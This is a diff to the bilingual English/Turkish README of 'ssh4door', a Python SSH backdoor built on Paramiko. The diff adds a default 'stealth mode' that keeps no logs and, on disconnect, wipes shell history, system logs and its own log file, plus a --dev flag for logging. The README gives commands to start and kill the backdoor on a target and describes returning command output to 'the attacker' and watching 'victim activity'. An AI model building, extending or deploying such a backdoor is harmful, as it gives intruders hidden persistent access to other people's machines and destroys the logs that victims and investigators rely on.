@@ -25,13 +25,15 @@ Built with [Paramiko](https://github.com/paramiko/paramiko). Listens for SSH con
 ## Features / Özellikler
 
 | English | Türkçe |
-|---|---|
+|---|---|---|
 | Interactive shell access | Etkileşimli shell erişimi |
 | Single-command (`exec`) execution | Tek komut (`exec`) çalıştırma |
 | Root mode (passwordless login when run as root) | Root modu (root ile çalıştırılınca şifresiz giriş) |
 | Custom port, password, and host binding | Özel port, şifre ve host tanımlama |
 | Background daemon mode with PID file | PID dosyası ile background daemon modu |
 | Built-in kill script (`kill.sh`) | Dahili durdurma betiği (`kill.sh`) |
+| **Stealth mode** — no logs, auto-cleanup after disconnect | **Stealth modu** — log tutmaz, bağlantı sonrası otomatik temizlik |
+| Developer mode (`--dev`) — full logging | Geliştirici modu (`--dev`) — tüm loglar kaydedilir |
 | Stealth — no real SSH daemon required | Gizli — gerçek SSH servisi gerektirmez |
 
 ---
@@ -65,7 +67,7 @@ source venv/bin/activate
 ### Foreground / Ön Planda
 
 ```bash
-# Default port 999, password 12345
+# Default port 999, password 12345 (stealth — no logs)
 sudo python3 ssh4door.py
 
 # Custom port and password
@@ -75,8 +77,11 @@ sudo python3 ssh4door.py --port 2222 --password sifre123
 ### Background / Arka Planda (Daemon — stealth)
 
 ```bash
-# Start backdoor / Backdoor'u başlat
+# Start backdoor — stealth mode (default, no logs)
 sudo python3 ssh4door.py --bg
+
+# Start backdoor — dev mode (logs saved)
+sudo python3 ssh4door.py --bg --dev
 
 # Kill backdoor / Backdoor'u öldür
 ./kill.sh
@@ -90,6 +95,7 @@ sudo python3 ssh4door.py --bg
 | `--port` | `-p` | Listening port | Dinlenecek port | `999` |
 | `--password` | `-P` | SSH password | SSH şifresi | `12345` |
 | `--host` | `-H` | Bind address | Bağlanılacak adres | `0.0.0.0` |
+| `--dev` | `-d` | Developer mode (keep logs) | Geliştirici modu (logları tut) | off |
 | `--pid-file` | | PID file path | PID dosya yolu | `/tmp/ssh4door.pid` |
 | `--log-file` | | Log file path (bg mode) | Log dosya yolu (bg modu) | `/tmp/ssh4door.log` |
 
@@ -126,6 +132,9 @@ ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 999 user@<tar
 
 5. **EN:** `exec` commands run server-side and return output to the attacker  
    **TR:** `exec` komutları sunucu tarafta çalışır ve çıktıyı saldırgana döndürür
+
+6. **EN:** On disconnect, stealth mode auto-clears shell history, system logs, and its own log file  
+   **TR:** Bağlantı kesilince stealth modu shell history, sistem logları ve kendi log dosyasını otomatik temizler
 
 ---
 
@@ -169,15 +178,20 @@ ssh4door/
 
 ## Logs / Günlükler
 
-**EN:** In background mode, all output goes to `/tmp/ssh4door.log`. Monitor victim activity with:
+**EN:** By default, **stealth mode** is active — no logs are written anywhere. Use `--dev` to enable logging. In background + dev mode, all output goes to `/tmp/ssh4door.log`.
 
-**TR:** Background modunda tüm çıktı `/tmp/ssh4door.log` dosyasına gider. Hedef aktivitesini izlemek için:
+**TR:** Varsayılan olarak **stealth modu** aktiftir — hiçbir yere log yazılmaz. Loglama için `--dev` kullanın. Background + dev modunda tüm çıktı `/tmp/ssh4door.log` dosyasına gider.
 
 ```bash
+# TR: Stealth mod (log tutmaz)
+sudo python3 ssh4door.py --bg
+
+# TR: Dev mod (logları görmek için)
+sudo python3 ssh4door.py --bg --dev
 tail -f /tmp/ssh4door.log
 ```
 
-### Sample Log / Örnek Log
+### Sample Log (dev mode) / Örnek Log (dev modu)
 
 ```
 [+] Yeni RSA host key olusturuldu: .../ssh4door/server.key
